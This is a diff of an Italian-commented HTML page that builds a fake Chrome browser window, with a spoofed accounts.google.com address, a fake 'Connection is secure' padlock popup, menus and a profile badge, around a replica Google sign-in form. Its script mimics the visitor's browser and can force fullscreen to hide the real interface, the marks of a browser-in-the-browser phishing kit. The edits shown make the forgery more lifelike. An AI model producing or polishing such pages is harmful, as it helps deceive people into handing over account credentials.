@@ -22,35 +22,26 @@
         }
 
         /* ==========================================================================
-           BROWSER BAR - CHROME
+           BROWSER BAR - CHROME (Design 2024 Material You)
            ========================================================================== */
         
         .browser-bar {
             width: 100%;
-            height: 56px;
-            background-color: #f3f3f3;
+            height: 48px; /* Altezza reale di Chrome */
+            background-color: #f1f3f4;
             border-bottom: 1px solid #dadce0;
             display: flex;
             align-items: center;
-            padding: 8px 12px;
+            padding: 0 8px;
             gap: 4px;
         }
 
-        .browser-bar.chrome {
-            background-color: #f3f3f3;
-        }
-
-        .browser-bar.firefox {
-            background-color: #f7f7f7;
-        }
-
-        .browser-bar.opera {
-            background-color: #f5f5f5;
-        }
+        .browser-bar.firefox { background-color: #f7f7f7; }
+        .browser-bar.opera { background-color: #f5f5f5; }
 
         .browser-button {
-            width: 32px;
-            height: 32px;
+            width: 34px;
+            height: 34px;
             border-radius: 50%;
             border: none;
             background-color: transparent;
@@ -58,46 +49,69 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #202124;
-            font-size: 16px;
-            transition: all 0.2s;
+            color: #444746;
+            font-size: 14px;
+            transition: background-color 0.2s;
         }
 
         .browser-button:hover {
-            background-color: rgba(0, 0, 0, 0.1);
+            background-color: rgba(0, 0, 0, 0.08);
         }
 
-        /* ADDRESS BAR CHROME */
+        /* OMNIBOX (Barra di ricerca reale Chrome) */
         .address-bar {
             flex: 1;
-            height: 40px;
-            background-color: #f0f0f0;
-            border: 1px solid #dadce0;
-            border-radius: 24px;
-            padding: 0 16px;
+            height: 34px;
+            background-color: #e9eef6; /* Grigio-azzurro di Chrome 2024 */
+            border-radius: 999px; /* Pillola perfetta */
+            padding: 0 6px 0 2px;
             display: flex;
             align-items: center;
-            gap: 8px;
-            margin: 0 8px;
-            transition: all 0.2s;
+            margin: 0 4px;
+            transition: background-color 0.2s, box-shadow 0.2s, border 0.2s;
+            border: 1px solid transparent;
         }
 
-        .browser-bar.chrome .address-bar {
-            border-radius: 24px;
+        /* Forme Firefox e Opera */
+        .browser-bar.firefox .address-bar { border-radius: 4px; background-color: #ffffff; border-color: #dadce0; }
+        .browser-bar.opera .address-bar { border-radius: 4px; background-color: #ffffff; border-color: #dadce0; }
+
+        .address-bar:hover {
+            background-color: #dfe3eb;
         }
 
-        .browser-bar.firefox .address-bar {
-            border-radius: 4px;
-        }
-
-        .browser-bar.opera .address-bar {
-            border-radius: 4px;
-        }
-
+        /* EFFETTO BLU QUANDO CLICCATA */
         .address-bar:focus-within {
-            background-color: white;
-            border-color: #dadce0;
-            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.08);
+            background-color: #ffffff;
+            border-color: #0b57d0; /* Blu Google */
+            box-shadow: 0 0 0 1px #0b57d0;
+        }
+
+        /* BOTTONE "-o o-" (Impostazioni Sito) */
+        .site-info-container {
+            position: relative;
+            height: 100%;
+            display: flex;
+            align-items: center;
+        }
+
+        .site-info-button {
+            height: 28px;
+            border-radius: 14px;
+            padding: 0 8px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #444746;
+            transition: background-color 0.2s;
+            margin-right: 4px;
+        }
+
+        .site-info-button:hover {
+            background-color: rgba(0, 0, 0, 0.08);
         }
 
         .address-bar input {
@@ -105,104 +119,121 @@
             border: none;
             outline: none;
             font-size: 14px;
-            color: #202124;
+            color: #1f1f1f;
             background: transparent;
+            font-family: inherit;
+            padding: 0 4px;
         }
 
-        .address-bar input::placeholder {
-            color: #80868b;
+        /* Colore selezione testo tipico di Chrome */
+        .address-bar input::selection {
+            background-color: #b3d4ff;
         }
 
-        /* LOCK ICON */
-        .lock-icon {
+        /* ICONE A DESTRA DELLA BARRA (Translate & Stella) */
+        .omnibox-actions {
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .action-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 20px;
-            height: 20px;
-            color: #5f6368;
-            font-size: 14px;
-        }
-
-        /* SITE INFO POPUP */
-        .site-info-container {
-            position: relative;
-        }
-
-        .site-info-button {
-            background: none;
+            background: transparent;
             border: none;
             cursor: pointer;
-            padding: 4px 8px;
-            color: #5f6368;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            transition: all 0.2s;
+            color: #444746;
+            transition: background-color 0.2s;
         }
 
-        .site-info-button:hover {
-            color: #202124;
+        .action-icon:hover {
+            background-color: rgba(0, 0, 0, 0.08);
         }
 
+        .action-icon svg {
+            fill: currentColor;
+            width: 18px;
+            height: 18px;
+        }
+
+        /* ==========================================================================
+           POPUP INFORMAZIONI SITO (Reale Chrome)
+           ========================================================================== */
         .site-info-popup {
             position: absolute;
-            top: 48px;
+            top: 36px;
             left: 0;
             background-color: white;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            min-width: 280px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
+            border-radius: 12px;
+            width: 320px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12), 0 0 2px rgba(0,0,0,0.1);
             display: none;
             z-index: 1000;
-            padding: 16px;
+            padding: 12px 0;
+            font-family: 'Segoe UI', Roboto, sans-serif;
         }
 
         .site-info-popup.active {
             display: block;
         }
 
+        .site-header {
+            padding: 8px 16px 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #f1f3f4;
+        }
+
+        .site-header-icon svg {
+            width: 20px;
+            height: 20px;
+            fill: #1f1f1f;
+        }
+
         .site-domain {
-            font-size: 14px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 12px;
+            font-size: 15px;
+            color: #1f1f1f;
         }
 
-        .site-info-item {
-            font-size: 13px;
-            color: #5f6368;
-            padding: 8px 0;
+        .site-row {
             display: flex;
             align-items: center;
-            gap: 8px;
-            border-bottom: 1px solid #e8eaed;
+            padding: 10px 16px;
+            cursor: pointer;
+            gap: 16px;
         }
 
-        .site-info-item:last-child {
-            border-bottom: none;
+        .site-row:hover {
+            background-color: #f8f9fa;
         }
 
-        .site-info-icon {
-            width: 16px;
-            height: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #5f6368;
-            font-size: 12px;
+        .site-row svg {
+            width: 20px;
+            height: 20px;
+            fill: #444746;
         }
 
-        .site-info-text {
+        .site-text {
             flex: 1;
+            font-size: 13px;
+            color: #1f1f1f;
         }
 
-        .site-info-text strong {
-            display: block;
-            color: #202124;
-            font-weight: 500;
+        .site-text-sub {
+            font-size: 12px;
+            color: #444746;
+            margin-top: 2px;
+        }
+
+        .arrow-right {
+            color: #444746;
+            font-size: 16px;
         }
 
         /* USER PROFILE SECTION */
@@ -210,12 +241,13 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            padding: 0 8px;
+            padding: 0 4px;
         }
 
         .user-name {
-            font-size: 13px;
-            color: #5f6368;
+            font-size: 12px;
+            font-weight: 500;
+            color: #444746;
             max-width: 100px;
             overflow: hidden;
             text-overflow: ellipsis;
@@ -230,10 +262,6 @@
             transition: transform 0.2s;
         }
 
-        .user-avatar:hover {
-            transform: scale(1.05);
-        }
-
         /* MENU DROPDOWN */
         .menu-container {
             position: relative;
@@ -241,53 +269,27 @@
 
         .menu-dropdown {
             position: absolute;
-            top: 48px;
+            top: 40px;
             right: 0;
             background-color: white;
             border: 1px solid #dadce0;
             border-radius: 8px;
-            min-width: 320px;
+            min-width: 280px;
             box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
             display: none;
             z-index: 1000;
         }
 
-        .menu-dropdown.active {
-            display: block;
-        }
+        .menu-dropdown.active { display: block; }
+        .menu-section { padding: 8px 0; border-bottom: 1px solid #dadce0; }
+        .menu-section:last-child { border-bottom: none; }
+        .menu-item { padding: 8px 24px; display: flex; align-items: center; gap: 12px; cursor: pointer; color: #202124; text-decoration: none; font-size: 13px; }
+        .menu-item:hover { background-color: #f8f9fa; }
+        .menu-item i { width: 20px; text-align: center; color: #5f6368; }
 
-        .menu-section {
-            padding: 8px 0;
-            border-bottom: 1px solid #dadce0;
-        }
-
-        .menu-section:last-child {
-            border-bottom: none;
-        }
-
-        .menu-item {
-            padding: 12px 24px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-            color: #202124;
-            text-decoration: none;
-            font-size: 14px;
-            transition: background-color 0.2s;
-        }
-
-        .menu-item:hover {
-            background-color: #f8f9fa;
-        }
-
-        .menu-item i {
-            width: 20px;
-            text-align: center;
-            color: #5f6368;
-        }
-
-        /* CONTENT AREA */
+        /* ==========================================================================
+           CONTENUTO PRINCIPALE (INTATTO)
+           ========================================================================== */
         .content {
             flex: 1;
             display: flex;
@@ -307,276 +309,122 @@
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
         }
 
-        /* HEADER */
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header svg { width: 40px; height: 40px; margin-bottom: 16px; }
+        .header h1 { font-size: 24px; font-weight: 400; color: #1f1f1f; margin-bottom: 8px; }
+        .header p { font-size: 16px; color: #444746; }
 
-        .header svg {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 16px;
-        }
+        .form-group { position: relative; margin-bottom: 20px; }
+        .form-control { width: 100%; padding: 16px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; outline: none; background: transparent; color: #1f1f1f; transition: border-color 0.2s; }
+        .form-control:focus { border: 2px solid #1a73e8; padding: 15px; }
+        .class-label { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); background: #ffffff; padding: 0 4px; color: #444746; transition: 0.2s ease all; pointer-events: none; font-size: 16px; }
+        .form-control:focus ~ .class-label, .form-control:not(:placeholder-shown) ~ .class-label { top: 0; font-size: 12px; color: #1a73e8; }
+        
+        .error-message { display: none; color: #b3261e; font-size: 12px; margin-top: 6px; padding-left: 4px; text-align: left;}
+        .form.submitted .form-control:invalid ~ .error-message { display: block; }
+        .form.submitted .form-control:invalid { border-color: #b3261e; }
+        .form.submitted .form-control:invalid ~ .class-label { color: #b3261e; }
 
-        .header h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #1f1f1f;
-            margin-bottom: 8px;
-        }
-
-        .header p {
-            font-size: 16px;
-            color: #444746;
-        }
-
-        /* FORM GROUP */
-        .form-group {
-            position: relative;
-            margin-bottom: 20px;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid #747775;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            background: transparent;
-            color: #1f1f1f;
-            transition: border-color 0.2s;
-        }
-
-        .form-control:focus {
-            border: 2px solid #1a73e8;
-            padding: 15px;
-        }
-
-        .class-label {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: #ffffff;
-            padding: 0 4px;
-            color: #444746;
-            transition: 0.2s ease all;
-            pointer-events: none;
-            font-size: 16px;
-        }
-
-        .form-control:focus ~ .class-label,
-        .form-control:not(:placeholder-shown) ~ .class-label {
-            top: 0;
-            font-size: 12px;
-            color: #1a73e8;
-        }
-
-        .error-message {
-            display: none;
-            color: #b3261e;
-            font-size: 12px;
-            margin-top: 6px;
-            padding-left: 4px;
-        }
-
-        .form.submitted .form-control:invalid ~ .error-message {
-            display: block;
-        }
-
-        .form.submitted .form-control:invalid {
-            border-color: #b3261e;
-        }
-
-        .form.submitted .form-control:invalid ~ .class-label {
-            color: #b3261e;
-        }
-
-        /* LINKS */
-        .links-action {
-            margin-bottom: 30px;
-        }
-
-        .forgot-link {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            transition: color 0.2s;
-        }
-
-        .forgot-link:hover {
-            color: #0d47a1;
-        }
-
-        /* GUEST NOTICE */
-        .guest-notice {
-            font-size: 14px;
-            color: #444746;
-            line-height: 1.4;
-            margin-bottom: 35px;
-        }
-
-        .guest-notice a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.2s;
-        }
-
-        .guest-notice a:hover {
-            color: #0d47a1;
-        }
-
-        /* BUTTONS */
-        .bottom-buttons {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .create-account {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            transition: color 0.2s;
-        }
-
-        .create-account:hover {
-            color: #0d47a1;
-        }
-
-        .form-button {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 100px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .form-button:hover {
-            background-color: #0d47a1;
-        }
-
-        .form-button:active {
-            background-color: #063399;
-        }
+        .links-action { margin-bottom: 30px; text-align: left;}
+        .forgot-link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .guest-notice { font-size: 14px; color: #444746; line-height: 1.4; margin-bottom: 35px; text-align: left;}
+        .guest-notice a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+        .bottom-buttons { display: flex; justify-content: space-between; align-items: center; }
+        .create-account { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .form-button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 100px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .form-button:hover { background-color: #0d47a1; }
     </style>
 </head>
 <body>
 
-    <!-- BROWSER BAR -->
+    <!-- BROWSER BAR (Reale Chrome Style) -->
     <div class="browser-bar" id="browserBar">
-        <button class="browser-button" id="backBtn" title="Indietro">
-            <i class="fas fa-arrow-left"></i>
-        </button>
-        <button class="browser-button" id="forwardBtn" title="Avanti">
-            <i class="fas fa-arrow-right"></i>
-        </button>
-        <button class="browser-button" id="reloadBtn" title="Ricarica">
-            <i class="fas fa-redo"></i>
-        </button>
+        <button class="browser-button" id="backBtn"><i class="fas fa-arrow-left"></i></button>
+        <button class="browser-button" id="forwardBtn"><i class="fas fa-arrow-right" style="color: #c7c7c7;"></i></button>
+        <button class="browser-button" id="reloadBtn"><i class="fas fa-redo"></i></button>
         
-        <!-- ADDRESS BAR -->
+        <!-- OMNIBOX (Barra di ricerca) -->
         <div class="address-bar" id="addressBar">
-            <div class="lock-icon">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
-                </svg>
-            </div>
-            <input type="text" id="urlInput" value="https://accounts.google.com/signin" readonly>
             
-            <!-- SITE INFO -->
+            <!-- POPUP E BOTTONE IMPOSTAZIONI SITO ("-o o-") -->
             <div class="site-info-container">
                 <button class="site-info-button" id="siteInfoBtn">
-                    <span>›</span>
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"/>
+                    </svg>
                 </button>
+
+                <!-- IL MENU CHE SI APRE CLICCANDO L'ICONA -->
                 <div class="site-info-popup" id="siteInfoPopup">
-                    <div class="site-domain">google.com</div>
-                    <div class="site-info-item">
-                        <div class="site-info-icon">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
-                                <path d="M12 1C6.48 1 2 5.48 2 11s4.48 10 10 10 10-4.48 10-10S17.52 1 12 1zm-2 15l-5-5 1.41-1.41L10 13.17l7.59-7.59L19 7l-9 9z"/>
-                            </svg>
+                    <div class="site-header">
+                        <div class="site-header-icon">
+                            <svg viewBox="0 0 24 24"><path d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"/></svg>
                         </div>
-                        <div class="site-info-text">
-                            <strong>Connection is secure</strong>
-                            Your information is encrypted
-                        </div>
+                        <div class="site-domain">google.com</div>
                     </div>
-                    <div class="site-info-item">
-                        <div class="site-info-icon">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
-                                <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
-                            </svg>
-                        </div>
-                        <div class="site-info-text">
-                            <strong>Cookies and site data</strong>
+                    
+                    <div class="site-row">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zm6 10v8H6v-8h12zm-9-2V7c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9z"/></svg>
+                        <div class="site-text">Connection is secure</div>
+                        <div class="arrow-right">›</div>
+                    </div>
+
+                    <div class="site-row">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+                        <div class="site-text">
+                            Cookies and site data
+                            <div class="site-text-sub">Manage on device site data</div>
                         </div>
                     </div>
                 </div>
             </div>
+
+            <!-- IL TESTO DELL'URL -->
+            <input type="text" id="urlInput" value="https://accounts.google.com/signin" readonly>
+            
+            <!-- ICONE DENTRO LA BARRA (Traduttore e Stella) -->
+            <div class="omnibox-actions">
+                <button class="action-icon" title="Traduci questa pagina">
+                    <!-- Icona Traduttore Google Vettoriale in bianco e nero -->
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12.87 15.07l-2.54-2.51.03-.03A17.52 17.52 0 0014.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/>
+                    </svg>
+                </button>
+                <button class="action-icon" id="starBtn" title="Aggiungi ai segnalibri">
+                    <!-- Icona Stella -->
+                    <svg viewBox="0 0 24 24">
+                        <path d="M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27 18.18 21l-1.63-7.03L22 9.24zM12 15.4l-3.76 2.27 1-4.28-3.32-2.88 4.38-.38L12 6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z"/>
+                    </svg>
+                </button>
+            </div>
         </div>
         
-        <!-- MENU BUTTON -->
+        <!-- MENU TRE PUNTINI -->
         <div class="menu-container">
-            <button class="browser-button menu-button" id="menuBtn" title="Menu">
+            <button class="browser-button" id="menuBtn" title="Personalizza e controlla Google Chrome">
                 <i class="fas fa-ellipsis-v"></i>
             </button>
             <div class="menu-dropdown" id="menuDropdown">
                 <div class="menu-section">
-                    <a class="menu-item" href="#">
-                        <i class="fas fa-window-restore"></i>
-                        <span>Nuova finestra</span>
-                    </a>
-                    <a class="menu-item" href="#">
-                        <i class="fas fa-user-secret"></i>
-                        <span>Nuova finestra anonima</span>
-                    </a>
+                    <a class="menu-item" href="#">Nuova scheda</a>
+                    <a class="menu-item" href="#">Nuova finestra</a>
+                    <a class="menu-item" href="#">Nuova finestra in incognito</a>
                 </div>
                 <div class="menu-section">
-                    <a class="menu-item" href="#">
-                        <i class="fas fa-bookmark"></i>
-                        <span>Segnalibri</span>
-                    </a>
-                    <a class="menu-item" href="#">
-                        <i class="fas fa-history"></i>
-                        <span>Cronologia</span>
-                    </a>
+                    <a class="menu-item" href="#">Cronologia</a>
+                    <a class="menu-item" href="#">Download</a>
+                    <a class="menu-item" href="#">Segnalibri e elenchi</a>
                 </div>
                 <div class="menu-section">
-                    <a class="menu-item" href="#">
-                        <i class="fas fa-download"></i>
-                        <span>Download</span>
-                    </a>
-                    <a class="menu-item" href="#">
-                        <i class="fas fa-cog"></i>
-                        <span>Impostazioni</span>
-                    </a>
-                </div>
-                <div class="menu-section">
-                    <a class="menu-item" href="#">
-                        <i class="fas fa-star"></i>
-                        <span>Aggiungi ai segnalibri</span>
-                    </a>
-                    <a class="menu-item" href="#">
-                        <i class="fas fa-info-circle"></i>
-                        <span>Informazioni su Chrome</span>
-                    </a>
+                    <a class="menu-item" href="#">Impostazioni</a>
+                    <a class="menu-item" href="#">Guida</a>
                 </div>
             </div>
         </div>
 
-        <!-- USER PROFILE -->
+        <!-- UTENTE (Work Guest) -->
         <div class="user-section">
-            <span class="user-name" id="userName">Work Guest</span>
+            <span class="user-name">Work Guest</span>
             <img src="https://lh3.googleusercontent.com/ogw/ADGmqu9BdZJfi0gpu2k5TjeWObRTFNI39xyvEWvSndua=s32-c-mo" alt="Profilo" class="user-avatar">
         </div>
     </div>
@@ -585,7 +433,6 @@
     <div class="content">
         <div class="login-container">
             
-            <!-- HEADER -->
             <div class="header">
                 <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                     <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
@@ -597,67 +444,55 @@
                 <p>Utilizza il tuo Account Google</p>
             </div>
 
-            <!-- FORM -->
             <form class="form" novalidate>
-                
                 <div class="form-group">
                     <input type="text" class="form-control" required placeholder=" " id="email">
                     <label class="class-label">Email o numero di telefono</label>
                     <span class="error-message">Inserisci un indirizzo email o un numero di telefono valido</span>
                 </div>
-
-                <div class="links-action">
-                    <a href="#" class="forgot-link">Hai dimenticato l'email?</a>
-                </div>
-
-                <div class="guest-notice">
-                    Non si tratta del tuo computer? Utilizza la modalità Ospite per accedere privatamente. <a href="#">Ulteriori informazioni</a>
-                </div>
-
+                <div class="links-action"><a href="#" class="forgot-link">Hai dimenticato l'email?</a></div>
+                <div class="guest-notice">Non si tratta del tuo computer? Utilizza la modalità Ospite per accedere privatamente. <a href="#">Ulteriori informazioni</a></div>
                 <div class="bottom-buttons">
                     <a href="#" class="create-account">Crea un account</a>
                     <button type="submit" class="form-button">Avanti</button>
                 </div>
-                
             </form>
 
         </div>
     </div>
 
     <script>
-        // RILEVA BROWSER
+        // RILEVA BROWSER E MODIFICA BARRA
         function detectBrowser() {
             const ua = navigator.userAgent;
             const browserBar = document.getElementById('browserBar');
-            const addressBar = document.getElementById('addressBar');
             
             if (ua.indexOf('Firefox') > -1) {
                 browserBar.classList.add('firefox');
-                addressBar.style.borderRadius = '4px';
             } else if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) {
                 browserBar.classList.add('opera');
-                addressBar.style.borderRadius = '4px';
-            } else {
-                browserBar.classList.add('chrome');
             }
         }
 
-        // SITE INFO POPUP
+        // POPUP INFORMAZIONI SITO (Il coso -o o-)
         const siteInfoBtn = document.getElementById('siteInfoBtn');
         const siteInfoPopup = document.getElementById('siteInfoPopup');
+        const urlInput = document.getElementById('urlInput');
 
         siteInfoBtn.addEventListener('click', (e) => {
             e.stopPropagation();
             siteInfoPopup.classList.toggle('active');
         });
 
-        document.addEventListener('click', () => {
-            siteInfoPopup.classList.remove('active');
+        // EFFETTO SELEZIONE URL (Simula Chrome reale)
+        urlInput.addEventListener('click', () => {
+            urlInput.select();
         });
 
-        // MENU DROPDOWN
+        // MENU CHROME E STELLA
         const menuBtn = document.getElementById('menuBtn');
         const menuDropdown = document.getElementById('menuDropdown');
+        const starBtn = document.getElementById('starBtn');
 
         menuBtn.addEventListener('click', (e) => {
             e.stopPropagation();
@@ -665,7 +500,22 @@
         });
 
         document.addEventListener('click', () => {
+            siteInfoPopup.classList.remove('active');
             menuDropdown.classList.remove('active');
+        });
+
+        // Cambia stella (piena/vuota)
+        starBtn.addEventListener('click', function() {
+            const svg = this.querySelector('svg');
+            if(svg.innerHTML.includes('12 15.4l-3.76')) {
+                // Stella Piena
+                svg.innerHTML = '<path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/>';
+                svg.style.fill = '#1a73e8'; // Diventa blu quando selezionata
+            } else {
+                // Stella Vuota
+                svg.innerHTML = '<path d="M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27 18.18 21l-1.63-7.03L22 9.24zM12 15.4l-3.76 2.27 1-4.28-3.32-2.88 4.38-.38L12 6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z"/>';
+                svg.style.fill = 'currentColor';
+            }
         });
 
         // BROWSER BUTTONS
@@ -685,15 +535,8 @@
         // FULLSCREEN
         function goFullscreen() {
             const elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen().catch(err => console.log('Errore fullscreen:', err));
-            } else if (elem.webkitRequestFullscreen) {
-                elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) {
-                elem.msRequestFullscreen();
-            } else if (elem.mozRequestFullScreen) {
-                elem.mozRequestFullScreen();
-            }
+            if (elem.requestFullscreen) { elem.requestFullscreen().catch(()=>{}); } 
+            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); } 
         }
 
         function showContent() {
